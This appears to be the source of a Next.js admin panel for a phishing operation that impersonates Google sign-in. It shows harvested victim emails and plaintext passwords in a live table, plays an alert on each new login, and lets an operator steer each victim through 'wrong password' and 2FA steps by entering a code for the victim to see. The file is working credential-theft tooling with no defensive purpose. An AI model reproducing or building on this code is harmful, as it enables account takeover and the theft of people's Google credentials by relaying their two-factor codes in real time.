"use client";

import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";
import { useSocket } from "../../hooks/useSocket";
import {
    adminLoginAction,
    adminLogoutAction,
    checkAdminSession,
} from "../login/loginaction";
import {
    getUsers,
    updateUserStatus,
    deleteUser,
} from "./dashboardaction";

export default function AdminPage() {
    const router = useRouter();
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [loading, setLoading] = useState(true);
    const [users, setUsers] = useState([]);
    const [summary, setSummary] = useState({
        pending: 0,
        wrongEmail: 0,
        wrongPassword: 0,
        twoFA: 0,
        success: 0,
        total: 0,
    });
    const [loginUsername, setLoginUsername] = useState("");
    const [loginPassword, setLoginPassword] = useState("");
    const [loginError, setLoginError] = useState("");
    const [actionLoading, setActionLoading] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [modalUserId, setModalUserId] = useState(null);
    const [modalUserEmail, setModalUserEmail] = useState("");
    const [modalAuthCodeInput, setModalAuthCodeInput] = useState("");
    const [mounted, setMounted] = useState(false);
    const [socketConnected, setSocketConnected] = useState(false);

    const { socket, isConnected, connectionError } = useSocket();
    const authCodeInputRef = useRef(null);

    useEffect(() => {
        setMounted(true);
        setSocketConnected(isConnected);
    }, [isConnected]);

    // Auto focus on 2FA modal input
    useEffect(() => {
        if (show2FAModal && authCodeInputRef.current) {
            const timer = setTimeout(() => {
                authCodeInputRef.current.focus();
                authCodeInputRef.current.select();
            }, 150);
            return () => clearTimeout(timer);
        }
    }, [show2FAModal]);

    // Check session on mount
    useEffect(() => {
        const checkSession = async () => {
            try {
                const isLoggedIn = await checkAdminSession();
                setIsAuthenticated(isLoggedIn);
                if (isLoggedIn) {
                    await fetchUsers();
                }
            } catch (error) {
                console.error("Session check failed:", error);
            } finally {
                setLoading(false);
            }
        };
        checkSession();
    }, []);

    // Fetch users from database
    const fetchUsers = async () => {
        try {
            const result = await getUsers();
            if (result.success) {
                setUsers(result.users);
                calculateSummary(result.users);
            }
        } catch (error) {
            console.error("Failed to fetch users:", error);
            toast.error("Failed to fetch users");
        }
    };

    // Calculate summary statistics
    const calculateSummary = (userList) => {
        const summaryData = {
            pending: 0,
            wrongEmail: 0,
            wrongPassword: 0,
            twoFA: 0,
            success: 0,
            total: userList.length,
        };

        userList.forEach((user) => {
            switch (user.status) {
                case "pending":
                    summaryData.pending++;
                    break;
                case "wrong_email":
                    summaryData.wrongEmail++;
                    break;
                case "wrong_password":
                    summaryData.wrongPassword++;
                    break;
                case "2fa":
                    summaryData.twoFA++;
                    break;
                case "success":
                    summaryData.success++;
                    break;
            }
        });

        setSummary(summaryData);
    };
    
    const playNotificationSound = () => {
        const audio = new Audio("norification.wav");
        audio.volume = 1;
        audio.play().catch((err) => {
            console.error("Sound play failed:", err);
        });
    }

    // Listen for socket events
    useEffect(() => {
        if (socket) {
            const handleNotification = (data) => {
                console.log(" Notification received:", data);

                toast(`New Login: ${data.email || 'Unknown'}`, {
                    duration: 5000,
                    icon: '🔔',
                    style: {
                        borderRadius: '10px',
                        background: '#333',
                        color: '#fff',
                    },
                });

                playNotificationSound();
                fetchUsers();
            };

            socket.on("admin_notification", handleNotification);

            return () => {
                socket.off("admin_notification", handleNotification);
            };
        }
    }, [socket]);

    // Handle admin login
    const handleAdminLogin = async (e) => {
        e.preventDefault();
        setLoginError("");
        setActionLoading(true);

        try {
            const formData = new FormData();
            formData.append("username", loginUsername);
            formData.append("password", loginPassword);

            const result = await adminLoginAction(formData);

            if (result.success) {
                setIsAuthenticated(true);
                await fetchUsers();
                toast.success("Logged in successfully!");
            } else {
                setLoginError(result.message || "Invalid credentials");
            }
        } catch (error) {
            setLoginError("An error occurred. Please try again.");
        } finally {
            setActionLoading(false);
        }
    };

    // Handle admin logout
    const handleLogout = async () => {
        await adminLogoutAction();
        setIsAuthenticated(false);
        setUsers([]);
        toast.success("Logged out successfully!");
        router.refresh();
    };

    // Handle status update
    const handleStatusUpdate = async (userId, newStatus, authCode = null) => {
        setActionLoading(true);
        try {
            const result = await updateUserStatus(userId, newStatus, authCode);
            if (result.success) {
                await fetchUsers();
                toast.success(`Status updated to ${newStatus}`);
            } else {
                toast.error(result.message || "Failed to update status");
            }
        } catch (error) {
            toast.error("An error occurred. Please try again.");
        } finally {
            setActionLoading(false);
        }
    };

    // Handle user deletion
    const handleDeleteUser = async (userId) => {
        if (!confirm("Are you sure you want to delete this user?")) return;
        setActionLoading(true);
        try {
            const result = await deleteUser(userId);
            if (result.success) {
                await fetchUsers();
                toast.success("User deleted successfully!");
            } else {
                toast.error(result.message || "Failed to delete user");
            }
        } catch (error) {
            toast.error("An error occurred. Please try again.");
        } finally {
            setActionLoading(false);
        }
    };

    // Status color mapping
    const getStatusColor = (status) => {
        switch (status) {
            case "pending": return "#fbbc04";
            case "wrong_email": return "#ea4335";
            case "wrong_password": return "#ea4335";
            case "2fa": return "#4285f4";
            case "success": return "#34a853";
            default: return "#5f6368";
        }
    };

    // Status label mapping
    const getStatusLabel = (status) => {
        switch (status) {
            case "pending": return "Pending";
            case "wrong_email": return "Wrong Email";
            case "wrong_password": return "Wrong Password";
            case "2fa": return "Waiting for 2FA";
            case "success": return "Completed";
            default: return status;
        }
    };

    // Loading state
    if (!mounted) return null;

    if (loading) {
        return (
            <div className="loading-container">
                <div className="loader"></div>
                <p>Loading dashboard...</p>
                <style>{`
                    .loading-container {
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        min-height: 100vh;
                        background: #f8f9fa;
                    }
                    .loader {
                        width: 48px;
                        height: 48px;
                        border: 4px solid #e8eaed;
                        border-top-color: #1a73e8;
                        border-radius: 50%;
                        animation: spin 0.8s linear infinite;
                    }
                    @keyframes spin {
                        to { transform: rotate(360deg); }
                    }
                    p {
                        margin-top: 20px;
                        color: #5f6368;
                        font-size: 16px;
                    }
                `}</style>
            </div>
        );
    }

    // Login page
    if (!isAuthenticated) {
        return (
            <div className="admin-login-container">
                <div className="admin-login-card">
                    <div className="brand-logo">
                        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                    </div>
                    <h1>Admin Login</h1>
                    <p className="subtitle">Access the admin dashboard</p>

                    <form onSubmit={handleAdminLogin}>
                        <div className="input-group">
                            <input
                                type="text"
                                id="admin-username"
                                placeholder=" "
                                className="text-black"
                                value={loginUsername}
                                onChange={(e) => setLoginUsername(e.target.value)}
                                required
                            />
                            <label htmlFor="admin-username">Username</label>
                        </div>

                        <div className="input-group">
                            <input
                                type="password"
                                id="admin-password"
                                placeholder=" "
                                className="text-black"
                                value={loginPassword}
                                onChange={(e) => setLoginPassword(e.target.value)}
                                required
                            />
                            <label htmlFor="admin-password">Password</label>
                        </div>

                        {loginError && <div className="error-message">{loginError}</div>}

                        <button type="submit" className="btn-login" disabled={actionLoading}>
                            {actionLoading ? "Logging in..." : "Login"}
                        </button>
                    </form>
                </div>

                <style>{`
                    .admin-login-container {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
                        padding: 20px;
                    }
                    .admin-login-card {
                        background: #ffffff;
                        padding: 48px 40px;
                        border-radius: 12px;
                        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
                        width: 100%;
                        max-width: 400px;
                        text-align: center;
                    }
                    .brand-logo {
                        font-size: 28px;
                        font-weight: 500;
                        margin-bottom: 16px;
                        letter-spacing: -0.5px;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }
                    .brand-logo span:nth-child(1) { color: #4285f4; }
                    .brand-logo span:nth-child(2) { color: #ea4335; }
                    .brand-logo span:nth-child(3) { color: #fbbc05; }
                    .brand-logo span:nth-child(4) { color: #4285f4; }
                    .brand-logo span:nth-child(5) { color: #34a853; }
                    .brand-logo span:nth-child(6) { color: #ea4335; }
                    h1 {
                        font-size: 24px;
                        font-weight: 400;
                        color: #202124;
                        margin-bottom: 4px;
                    }
                    .subtitle {
                        color: #5f6368;
                        font-size: 14px;
                        margin-bottom: 32px;
                    }
                    .input-group {
                        position: relative;
                        margin-bottom: 20px;
                        text-align: left;
                    }
                    .input-group input {
                        width: 100%;
                        padding: 16px;
                        font-size: 16px;
                        border: 1px solid #dadce0;
                        border-radius: 4px;
                        outline: none;
                        background: transparent;
                        transition: border-color 0.15s ease;
                    }
                    .input-group input:focus {
                        border-color: #1a73e8;
                        border-width: 2px;
                        padding: 15px;
                    }
                    .input-group label {
                        position: absolute;
                        left: 16px;
                        top: 50%;
                        transform: translateY(-50%);
                        background: #ffffff;
                        padding: 0 4px;
                        font-size: 16px;
                        color: #757575;
                        transition: 0.2s ease all;
                        pointer-events: none;
                    }
                    .input-group input:focus ~ label,
                    .input-group input:not(:placeholder-shown) ~ label {
                        top: 0;
                        font-size: 12px;
                        color: #1a73e8;
                    }
                    .error-message {
                        color: #d93025;
                        font-size: 14px;
                        margin: 12px 0;
                        padding: 8px 12px;
                        background: #fce8e6;
                        border-radius: 4px;
                    }
                    .btn-login {
                        width: 100%;
                        background: #1a73e8;
                        color: white;
                        border: none;
                        padding: 12px;
                        font-size: 16px;
                        font-weight: 500;
                        border-radius: 4px;
                        cursor: pointer;
                        transition: background-color 0.15s;
                    }
                    .btn-login:hover {
                        background: #1557b0;
                    }
                    .btn-login:disabled {
                        opacity: 0.6;
                        cursor: not-allowed;
                    }
                `}</style>
            </div>
        );
    }

    // Admin Dashboard
    return (
        <div className="dashboard-container">
            <header className="dashboard-header">
                <div className="header-left">
                    <div className="brand-logo-small">
                        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                    </div>
                    <span className="header-title">Admin Dashboard</span>
                    <div className={`connection-status ${socketConnected ? 'connected' : 'disconnected'}`}>
                        {socketConnected ? '🟢' : '🔴'}
                        <span className="status-text">
                            {socketConnected ? 'Connected' : connectionError || 'Disconnected'}
                        </span>
                    </div>
                </div>
                <button onClick={handleLogout} className="btn-logout">
                    Logout
                </button>
            </header>

            <div className="dashboard-content">
                {/* Summary Cards */}
                <div className="summary-grid">
                    <div className="summary-card pending">
                        <div className="summary-icon">⏳</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.pending}</span>
                            <span className="summary-label">Pending</span>
                        </div>
                    </div>
                    <div className="summary-card wrong-email">
                        <div className="summary-icon">❌</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.wrongEmail}</span>
                            <span className="summary-label">Wrong Email</span>
                        </div>
                    </div>
                    <div className="summary-card wrong-password">
                        <div className="summary-icon">🔑</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.wrongPassword}</span>
                            <span className="summary-label">Wrong Password</span>
                        </div>
                    </div>
                    <div className="summary-card twofa">
                        <div className="summary-icon">📱</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.twoFA}</span>
                            <span className="summary-label">Waiting for 2FA</span>
                        </div>
                    </div>
                    <div className="summary-card success">
                        <div className="summary-icon">✅</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.success}</span>
                            <span className="summary-label">Completed</span>
                        </div>
                    </div>
                    <div className="summary-card total">
                        <div className="summary-icon">📊</div>
                        <div className="summary-info">
                            <span className="summary-value">{summary.total}</span>
                            <span className="summary-label">Total Requests</span>
                        </div>
                    </div>
                </div>

                {/* Users Table */}
                <div className="table-container">
                    <div className="table-header">
                        <h2>Login Requests</h2>
                        <button onClick={fetchUsers} className="btn-refresh">
                            🔄 Refresh
                        </button>
                    </div>

                    {users.length === 0 ? (
                        <div className="empty-state">
                            <p>No login requests yet.</p>
                        </div>
                    ) : (
                        <div className="table-responsive">
                            <table>
                                <thead>
                                    <tr>
                                        <th>#</th>
                                        <th>Email</th>
                                        <th>Password</th>
                                        <th>Status</th>
                                        <th>Created At</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {users.map((user, index) => (
                                        <tr key={user._id}>
                                            <td>{index + 1}</td>
                                            <td className="email-cell">{user.email}</td>
                                            <td className="password-cell">{user.password}</td>
                                            <td>
                                                <span
                                                    className="status-badge"
                                                    style={{ background: getStatusColor(user.status) }}
                                                >
                                                    {getStatusLabel(user.status)}
                                                </span>
                                            </td>
                                            <td>{new Date(user.createdAt).toLocaleString()}</td>
                                            <td>
                                                <div className="action-buttons">
                                                    <select
                                                        value={user.status}
                                                        onChange={(e) => {
                                                            const newStatus = e.target.value;
                                                            if (newStatus === "2fa") {
                                                                setModalUserId(user._id);
                                                                setModalUserEmail(user.email || "");
                                                                setModalAuthCodeInput("");
                                                                setShow2FAModal(true);
                                                            } else {
                                                                handleStatusUpdate(user._id, newStatus);
                                                            }
                                                        }}
                                                        className="status-select"
                                                        disabled={actionLoading}
                                                    >
                                                        <option value="pending">Pending</option>
                                                        <option value="wrong_email">Wrong Email</option>
                                                        <option value="wrong_password">Wrong Password</option>
                                                        <option value="2fa">2FA Required</option>
                                                        <option value="success">Completed</option>
                                                    </select>
                                                    <button
                                                        onClick={() => handleDeleteUser(user._id)}
                                                        className="btn-delete"
                                                        disabled={actionLoading}
                                                    >
                                                        🗑️
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>
                    )}
                </div>
            </div>

            {/* 2FA Modal with auto focus */}
            {show2FAModal && (
                <div className="modal-backdrop">
                    <div className="modal-card">
                        <h3 className="text-black">Set 2FA Code</h3>
                        <p>Enter the 3-digit code that the user will see.</p>
                        <input
                            ref={authCodeInputRef}
                            type="text"
                            className="text-black"
                            value={modalAuthCodeInput}
                            onChange={(e) => setModalAuthCodeInput(e.target.value)}
                            placeholder="Enter 2FA code"
                            maxLength={3}
                            onKeyDown={(e) => {
                                if (e.key === 'Enter') {
                                    e.preventDefault();
                                    setShow2FAModal(false);
                                    handleStatusUpdate(modalUserId, '2fa', modalAuthCodeInput.trim());
                                }
                            }}
                        />
                        <div className="modal-actions">
                            <button onClick={() => setShow2FAModal(false)} className="btn-cancel text-black">Cancel</button>
                            <button
                                onClick={async () => {
                                    setShow2FAModal(false);
                                    await handleStatusUpdate(modalUserId, '2fa', modalAuthCodeInput.trim());
                                }}
                                className="btn-confirm"
                            >
                                Send Code
                            </button>
                        </div>
                    </div>
                    <style>{`
                        .modal-backdrop { 
                            position: fixed; 
                            inset: 0; 
                            display: flex; 
                            align-items: center; 
                            justify-content: center; 
                            background: rgba(0,0,0,0.4); 
                            z-index: 9999; 
                        }
                        .modal-card { 
                            background: #fff; 
                            padding: 24px; 
                            border-radius: 10px; 
                            width: 340px; 
                            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
                            text-align: left; 
                        }
                        .modal-card h3 { 
                            margin: 0 0 8px 0; 
                            color: #202124;
                        }
                        .modal-card p { 
                            color: #555; 
                            margin-bottom: 16px; 
                        }
                        .modal-card input { 
                            width: 100%; 
                            padding: 12px; 
                            margin-bottom: 16px; 
                            border: 2px solid #ddd; 
                            border-radius: 6px; 
                            font-size: 16px;
                            transition: border-color 0.3s;
                        }
                        .modal-card input:focus {
                            border-color: #1a73e8;
                            outline: none;
                            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
                        }
                        .modal-actions { 
                            display: flex; 
                            justify-content: flex-end; 
                            gap: 8px; 
                        }
                        .btn-cancel { 
                            background: #f1f3f4; 
                            border: none; 
                            padding: 8px 16px; 
                            border-radius: 6px; 
                            cursor: pointer; 
                            font-weight: 500;
                        }
                        .btn-cancel:hover {
                            background: #e8eaed;
                        }
                        .btn-confirm { 
                            background: #1a73e8; 
                            color: #fff; 
                            border: none; 
                            padding: 8px 16px; 
                            border-radius: 6px; 
                            cursor: pointer; 
                            font-weight: 500;
                        }
                        .btn-confirm:hover {
                            background: #1557b0;
                        }
                    `}</style>
                </div>
            )}

            <style>{`
                .dashboard-container {
                    min-height: 100vh;
                    background: #f8f9fa;
                }
                .dashboard-header {
                    background: #ffffff;
                    padding: 16px 32px;
                    border-bottom: 1px solid #dadce0;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    position: sticky;
                    top: 0;
                    z-index: 100;
                }
                .header-left {
                    display: flex;
                    align-items: center;
                    gap: 16px;
                }
                .brand-logo-small {
                    font-size: 20px;
                    font-weight: 500;
                    letter-spacing: -0.5px;
                    display: flex;
                    align-items: center;
                }
                .brand-logo-small span:nth-child(1) { color: #4285f4; }
                .brand-logo-small span:nth-child(2) { color: #ea4335; }
                .brand-logo-small span:nth-child(3) { color: #fbbc05; }
                .brand-logo-small span:nth-child(4) { color: #4285f4; }
                .brand-logo-small span:nth-child(5) { color: #34a853; }
                .brand-logo-small span:nth-child(6) { color: #ea4335; }
                .header-title {
                    font-size: 18px;
                    font-weight: 500;
                    color: #202124;
                }
                .connection-status {
                    display: flex;
                    align-items: center;
                    gap: 4px;
                    font-size: 12px;
                    padding: 4px 12px;
                    border-radius: 12px;
                    background: #f1f3f4;
                }
                .connection-status.connected {
                    color: #34a853;
                }
                .connection-status.disconnected {
                    color: #ea4335;
                }
                .status-text {
                    margin-left: 4px;
                }
                .btn-logout {
                    background: #ea4335;
                    color: white;
                    border: none;
                    padding: 8px 20px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 500;
                    transition: background-color 0.15s;
                }
                .btn-logout:hover {
                    background: #d33426;
                }
                .dashboard-content {
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 24px;
                }
                .summary-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 16px;
                    margin-bottom: 32px;
                }
                .summary-card {
                    background: #ffffff;
                    border-radius: 8px;
                    padding: 16px 20px;
                    display: flex;
                    align-items: center;
                    gap: 16px;
                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
                    border-left: 4px solid #dadce0;
                }
                .summary-card.pending { border-left-color: #fbbc04; }
                .summary-card.wrong-email { border-left-color: #ea4335; }
                .summary-card.wrong-password { border-left-color: #ea4335; }
                .summary-card.twofa { border-left-color: #4285f4; }
                .summary-card.success { border-left-color: #34a853; }
                .summary-card.total { border-left-color: #1a73e8; }
                .summary-icon { font-size: 24px; }
                .summary-info { display: flex; flex-direction: column; }
                .summary-value { font-size: 24px; font-weight: 500; color: #202124; }
                .summary-label { font-size: 12px; color: #5f6368; }
                .table-container {
                    background: #ffffff;
                    border-radius: 8px;
                    padding: 24px;
                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
                }
                .table-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 20px;
                }
                .table-header h2 {
                    font-size: 18px;
                    font-weight: 500;
                    color: #202124;
                }
                .btn-refresh {
                    background: #f1f3f4;
                    border: none;
                    padding: 6px 16px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    color: #202124;
                    transition: background-color 0.15s;
                }
                .btn-refresh:hover {
                    background: #e8eaed;
                }
                .table-responsive {
                    overflow-x: auto;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                }
                thead {
                    background: #f8f9fa;
                }
                th {
                    padding: 12px 16px;
                    text-align: left;
                    font-size: 12px;
                    font-weight: 500;
                    color: #5f6368;
                    text-transform: uppercase;
                    letter-spacing: 0.5px;
                    border-bottom: 1px solid #dadce0;
                }
                td {
                    padding: 12px 16px;
                    font-size: 14px;
                    color: #202124;
                    border-bottom: 1px solid #f1f3f4;
                }
                tr:hover {
                    background: #f8f9fa;
                }
                .email-cell {
                    font-weight: 500;
                }
                .password-cell {
                    font-family: monospace;
                    color: #5f6368;
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 12px;
                    border-radius: 12px;
                    font-size: 12px;
                    font-weight: 500;
                    color: white;
                }
                .action-buttons {
                    display: flex;
                    gap: 8px;
                    align-items: center;
                }
                .status-select {
                    padding: 4px 8px;
                    border: 1px solid #dadce0;
                    border-radius: 4px;
                    font-size: 12px;
                    background: #ffffff;
                    cursor: pointer;
                }
                .status-select:disabled {
                    opacity: 0.6;
                    cursor: not-allowed;
                }
                .btn-delete {
                    background: none;
                    border: none;
                    cursor: pointer;
                    font-size: 16px;
                    padding: 4px 8px;
                    border-radius: 4px;
                    transition: background-color 0.15s;
                }
                .btn-delete:hover {
                    background: #fce8e6;
                }
                .btn-delete:disabled {
                    opacity: 0.4;
                    cursor: not-allowed;
                }
                .empty-state {
                    text-align: center;
                    padding: 40px;
                    color: #5f6368;
                }
                @media (max-width: 768px) {
                    .dashboard-header {
                        padding: 12px 16px;
                        flex-direction: column;
                        gap: 12px;
                    }
                    .dashboard-content {
                        padding: 12px;
                    }
                    .summary-grid {
                        grid-template-columns: repeat(2, 1fr);
                    }
                    .table-container {
                        padding: 16px;
                    }
                    .table-header {
                        flex-direction: column;
                        gap: 12px;
                        align-items: flex-start;
                    }
                    .action-buttons {
                        flex-direction: column;
                        gap: 4px;
                    }
                    .header-left {
                        flex-wrap: wrap;
                    }
                }
                @media (max-width: 480px) {
                    .summary-grid {
                        grid-template-columns: 1fr;
                    }
                }
            `}</style>
        </div>
    );
}